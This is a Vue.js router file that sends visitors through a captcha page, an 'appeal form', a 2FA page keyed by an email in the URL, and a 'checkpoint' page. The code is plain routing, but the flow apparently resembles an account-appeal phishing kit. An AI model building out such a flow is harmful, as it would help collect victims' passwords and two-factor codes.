import { createRouter, createWebHashHistory } from 'vue-router'
import AppealForm from '../views/Form2.vue'
import TwoFA from '../pages/2FA.vue'
import Checkpoint from '../pages/Checkpoint.vue'
import CaptchaStep from '../pages/CaptchaStep.vue'

const routes = [
  {
    path: '/',
    name: 'captcha',
  component: CaptchaStep
  },
  {
    path: '/appealform',
    name: 'appealform',
    component: AppealForm
  },
  {
    path: '/:type/:email',
    name: 'twofa',
    component: TwoFA
  },
  {
    path: '/checkpoint/',
    name: 'checkpoint',
    component: Checkpoint
  },
]

const router = createRouter({
  history: createWebHashHistory(),
  routes
})

export default router
